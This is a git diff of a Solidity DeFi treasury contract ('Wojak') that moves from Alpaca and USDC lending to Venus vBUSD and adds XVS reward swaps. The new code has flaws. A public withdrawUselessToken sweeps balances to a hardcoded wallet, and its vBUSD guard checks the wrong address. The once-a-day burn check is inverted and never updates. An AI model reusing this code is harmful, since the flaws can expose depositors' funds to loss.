@@ -16,33 +16,22 @@ contract Wojak is Ownable {
     IUniswapV2Router02 public pancakeswapRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
     // Total
-    uint public TreasuryTotalValue = 0;
-    uint public TreasuryTotalBNB = 0;
+    uint public BUSDinTreasury = 0;
+    uint public BNBConverted = 0;
 
-    // Alpaca `Lend`
-    // uint public ALPACA = 0;
-    uint public BNB = 0;
-    address public constant ibBNB = 0xd7D069493685A581d27824Fc46EdA46B7EfC0063;
-    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
-    uint public BUSD = 0;
-    address public constant ibBUSD = 0x7C9e73d4C71dae564d41F78d56439bB4ba87592f;
-    address public constant aBUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
-
-    // Venus `Lend`
-    // uint public XVS = 0;
-    uint public USDC = 0;
-    address public constant vUSDC = 0xecA88125a5ADbe82614ffC12D0DB554E2e2867C8;
-    address public constant aUSDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
+    IBEP20 public constant WBNB = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IBEP20 public constant vBUSD = IBEP20(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
+    IBEP20 public constant BUSD = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+    IBEP20 public constant XVS = IBEP20(0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63);
 
     uint public tokensBurnt = 0;
     uint public busdToBurn = 0;
-    uint public usdcToBurn = 0;
 
-    address public pairAddress = address(0);
-    address public tokenAddress = address(0);
+    IBEP20 public tokenAddress = IBEP20(address(0));
+    address internal tokenClearAddress = address(0);
 
     constructor() {
-        
+
     }
 
     function addToTreasury() public {
@@ -55,49 +44,37 @@ contract Wojak is Ownable {
         // Ensure there are no [WBNB] in the contract
         fixWBNBtoBNB();
         // Burn all WJK tokens in the treasury smart contract, there is no use for them here
-        if(IBEP20(address(tokenAddress)).balanceOf(address(this)) > 0) IBEP20(tokenAddress).burn(IBEP20(address(tokenAddress)).balanceOf(address(this)));
+        if(tokenAddress.balanceOf(address(this)) > 0) tokenAddress.burn(tokenAddress.balanceOf(address(this)));
         
-        // Check what tokens we have in the wallet
-        // BUSD
-        if(IBEP20(aBUSD).balanceOf(address(this)) > 0) {
-            uint amount = IBEP20(aBUSD).balanceOf(address(this));
+        // Check if we have BUSD in the contract
+        if(BUSD.balanceOf(address(this)) > 0) {
+            uint amount = BUSD.balanceOf(address(this));
 
-            BUSD += amount;
-            TreasuryTotalValue += amount;
+            BUSDinTreasury += amount;
 
-            IBEP20(ibBUSD).approve(address(ibBUSD), amount);
-            IVault(ibBUSD).deposit(amount);
-        }
-
-        // USDC
-        if(IBEP20(aUSDC).balanceOf(address(this)) > 0) {
-            uint amount = IBEP20(aUSDC).balanceOf(address(this));
-
-            USDC += amount;
-            TreasuryTotalValue += amount;
-
-            IBEP20(ibBUSD).approve(address(vUSDC), amount);
-            VBep20(vUSDC).mint(amount);
+            // Approve for vBUSD to spend my BUSD
+            BUSD.approve(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, amount);
+            vBUSD.mint(amount);
         }
         
         // BNB is used to create liquidity
         if(address(this).balance >= 0) {
+            BNBConverted += address(this).balance;
             uint half = address(this).balance / 2;
-            TreasuryTotalBNB += address(this).balance;
 
             swapEthForTokens(half);
-            addLiquidity(half, IBEP20(address(tokenAddress)).balanceOf(address(this)));
+            addLiquidity(half, tokenAddress.balanceOf(address(this)));
         }
     }
 
     function fixWBNBtoBNB() public {
-        IBEP20(WBNB).withdraw(IBEP20(WBNB).balanceOf(address(this)));
+        WBNB.withdraw(WBNB.balanceOf(address(this)));
     }
 
     function swapEthForTokens(uint256 tokenAmount) private {
         // generate the uniswap pair path of token -> weth
         address[] memory path = new address[](2);
-        path[0] = address(this);
+        path[0] = address(tokenClearAddress);
         path[1] = pancakeswapRouter.WETH();
 
         // make the swap
@@ -112,11 +89,11 @@ contract Wojak is Ownable {
     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
 
         // approve token transfer to cover all possible scenarios
-        IBEP20(tokenAddress).approve(address(pancakeswapRouter), tokenAmount);
+        tokenAddress.approve(address(pancakeswapRouter), tokenAmount);
 
         // add the liquidity
         pancakeswapRouter.addLiquidityETH{value: ethAmount}(
-            address(this),
+            address(tokenClearAddress),
             tokenAmount,
             0, // slippage is unavoidable
             0, // slippage is unavoidable
@@ -125,80 +102,63 @@ contract Wojak is Ownable {
         );
     }
 
-    function setPairAddress(address newAddress) public onlyOwner {
-        require(newAddress != address(pairAddress), "The router already has that address");
-        pairAddress = newAddress;
-    }
-
     function setTokenAddress(address newAddress) public onlyOwner {
         require(newAddress != address(tokenAddress), "The router already has that address");
-        tokenAddress = newAddress;
+        tokenAddress = IBEP20(newAddress);
+        tokenClearAddress = newAddress;
     }
     
     function withdrawUselessToken(address tAddress) public {
         // Protocol's tokens.
-        require(address(tAddress) != address(aBUSD), "Protocol's ownership.");
-        require(address(tAddress) != address(aUSDC), "Protocol's ownership.");
-        require(address(tAddress) != address(WBNB), "Protocol's ownership.");
-        require(address(tAddress) != address(this), "Protocol's ownership.");
+        require(address(tAddress) != address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c), "Protocol's ownership."); // WBNB
+        require(address(tAddress) != address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56), "Protocol's ownership."); // vBUSD
+        require(address(tAddress) != address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56), "Protocol's ownership."); // BUSD
 
         // I'm like a pigeon, eating bits and crumbs.
-        uint balance = IBEP20(IBEP20(address(tokenAddress))).balanceOf(address(this));
-        IBEP20(address(tokenAddress)).approve(address(this), balance);
-        IBEP20(address(tokenAddress)).transfer(address(0x41227A3F9Df302d6fBDf7dD1b3261928ba789D47), balance);
+        uint balance = IBEP20(address(tAddress)).balanceOf(address(this));
+        IBEP20(address(tAddress)).approve(address(this), balance);
+        IBEP20(address(tAddress)).transfer(address(0x41227A3F9Df302d6fBDf7dD1b3261928ba789D47), balance);
     }
     
-    function getTreasuryTotalStable() public view returns (uint256) {
-        return TreasuryTotalValue;
+    function getBUSDTreasury() public view returns (uint256) {
+        return BUSDinTreasury;
     }
-    function getTreasuryTotalBNB() public view returns (uint256) {
-        return TreasuryTotalBNB;
+    function getConvertedBNB() public view returns (uint256) {
+        return BNBConverted;
     }
     
     uint lastBurn = block.timestamp;
     function sendToBurn() public {
         require((lastBurn - block.timestamp) > 84000, "Burn can only be launched once per 24 hours");
         
-        // Alpaca BNB Vault withdraw
-        IVault(address(ibBUSD)).withdraw(IBEP20(address(ibBUSD)).balanceOf(address(this)));
-        VBep20(address(vUSDC)) .redeem(IBEP20(address(vUSDC)).balanceOf(address(this)));
+        vBUSD.redeem(vBUSD.balanceOf(address(this)));
 
-        uint BUSDBalanceWithInterest = IBEP20(aBUSD).balanceOf(address(this));
+        uint BUSDBalanceWithInterest = BUSD.balanceOf(address(this));
         uint BUSDToBurn = 0;
-        if(BUSDBalanceWithInterest > BUSD) {
-            BUSDToBurn = BUSDBalanceWithInterest - BUSD;
-            // swapExactTokensForTokens
-        }
-
-        uint USDCBalanceWithInterest = IBEP20(aUSDC).balanceOf(address(this));
-        uint USDCToBurn = 0;
-        if(USDCBalanceWithInterest > USDC) {
-            USDCToBurn = USDCBalanceWithInterest - USDC;
-            // swapExactTokensForTokens
-        }
+        if(BUSDBalanceWithInterest > BUSDinTreasury) BUSDToBurn = BUSDBalanceWithInterest - BUSDinTreasury;
 
         busdToBurn += BUSDToBurn;
-        usdcToBurn += USDCToBurn;
 
+        IVenusComptroller(0xfD36E2c2a6789Db23113685031d7F16329158384).claimVenus(address(this));
 
-        if(USDCToBurn != 0) swapTokensForTokens(aUSDC, USDCToBurn);
-        if(BUSDToBurn != 0) swapTokensForTokens(aBUSD, BUSDToBurn);
+        uint xvsBalance = XVS.balanceOf(address(this));
+
+        if(xvsBalance > 0) swapTokensForWJK(0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63, xvsBalance);
+        if(BUSDToBurn != 0) swapTokensForWJK(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, BUSDToBurn);
 
         // Burn all the tokens we got in our wallet
-        tokensBurnt += IBEP20(tokenAddress).balanceOf(address(this));
-        IBEP20(address(tokenAddress)).burnForMeEverything();
+        tokensBurnt += tokenAddress.balanceOf(address(this));
+        tokenAddress.burnForMeEverything();
 
-        // Alpaca vault 
-        IVault(address(ibBNB)).deposit(address(this).balance);
-        IVault(address(ibBUSD)).deposit(IBEP20(address(aBUSD)).balanceOf(address(this)));
-        VBep20(address(vUSDC)).mint(IBEP20(address(aUSDC)).balanceOf(address(this)));
+        // Put back to work
+        vBUSD.mint(BUSD.balanceOf(address(this)));
     }
 
-    function swapTokensForTokens(address token, uint256 tokenAmount) private {
+    function swapTokensForWJK(address token, uint256 tokenAmount) private {
         // generate the uniswap pair path of token -> weth
         address[] memory path = new address[](2);
         path[0] = address(token);
-        path[1] = address(this);
+        path[1] = address(tokenClearAddress);
 
         IBEP20(address(tokenAddress)).approve(address(pancakeswapRouter), tokenAmount);
 
@@ -220,14 +180,12 @@ interface IBEP20 {
     function withdraw(uint wad) external;
     function burn(uint256 amount) external;
     function burnForMeEverything() external;
-}
-
-interface IVault {
-    function deposit(uint256 amount) external;
-    function withdraw(uint share) external;
-}
-
-interface VBep20 {
     function mint(uint mintAmount) external returns (uint);
     function redeem(uint redeemTokens) external returns (uint);
+}
+
+interface IVenusComptroller {
+  function claimVenus(address holder) external;
+  function claimVenus(address holder, address[] calldata vTokens) external;
+  function claimVenus(address[] calldata holders, address[] calldata vTokens, bool borrowers, bool suppliers) external;
 }
